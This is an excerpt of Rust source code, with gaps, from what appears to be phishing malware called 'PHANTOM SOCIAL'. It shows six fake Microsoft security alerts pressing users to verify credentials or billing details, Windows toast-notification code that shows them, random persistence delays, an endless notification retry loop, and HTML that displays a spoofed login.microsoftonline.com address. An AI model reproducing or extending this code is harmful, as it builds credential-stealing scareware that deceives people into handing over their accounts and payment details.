// ==========================================================================
// PHANTOM SOCIAL v7.1 - ALIGNED INFO BOX MESSAGES
// ===========================================================================
...
const ACTION_MESSAGES: [&str; 6] = [
    "Suspicious activity detected on your Microsoft account. Verify your credentials to restore access.",
    "Unauthorized access attempt detected on your Microsoft account. Verify your credentials immediately to secure your account.",
    "Microsoft Security has flagged unusual activity. Confirm your billing credentials to prevent account suspension.",
    "We've detected sign-in from an unrecognized device. Verify your credentials to confirm your identity.",
    "Your account may have been exposed in a security breach. Update your credentials immediately as a security precaution.",
    "Your Microsoft account will be permanently locked due to suspicious billing activity. Verify your credentials to prevent suspension.",
];
// v7.1: Web page info box messages (aligned with toast notifications)
const INFO_BOX_MESSAGES: [(&str, &str); 6] = [
    ("Security Alert", "Suspicious activity has been detected on your Microsoft account. Please verify your credentials immediately to restore full access to your services."),
    ("Security Alert", "An unauthorized access attempt was detected on your Microsoft account from an unrecognized location. Verify your credentials now to secure your account."),
    ("Account Security Notice", "Microsoft Security systems have flagged unusual activity on your account. Please confirm your billing credentials to prevent temporary suspension of services."),
    ("Identity Verification Required", "We detected a sign-in attempt from an unrecognized device. For your security, please verify your credentials to confirm your identity and maintain account access."),
    ("Security Breach Alert", "Your Microsoft account may have been compromised in a recent security incident. Please update your credentials immediately as a mandatory security precaution."),
    ("Critical Account Warning", "Your Microsoft account will be permanently locked within 24 hours due to suspicious billing activity. Verify your credentials now to prevent permanent suspension."),
];
...
fn select_persistent_message_index(machine_id: &str) -> usize {
    let hash = djb2_hash_str(machine_id);
    (hash as usize) % ACTION_MESSAGES.len()
}
...
fn get_random_persist_delay() -> u64 {
    rand::thread_rng().gen_range(240..=500)
}
...
fn show_toast(notif_type: NotificationType) {
    ...
    let xml_string = format!(
        r#"<toast launch="{}"><visual><binding template="ToastGeneric"><text>{}</text><text>{}</text><image placement="appLogoOverride" src="{}"/></binding></visual>{}<audio src="ms-winsoundevent:Notification.Default"/></toast>"#,
        launch_arg,
        html_escape(title),
        html_escape(message),
        icon_uri,
...
fn notification_loop() {
    ...
    loop {
        ...
        if count >= 5 {
            ...
            thread::sleep(Duration::from_secs(get_retry_delay()));
        }
    }
}
...
<span class="url">
<span class="url-domain">login.microsoftonline.com</span>/common/oauth2/v2.0/authorize?client_id=4593-39f...
</span>
</div>
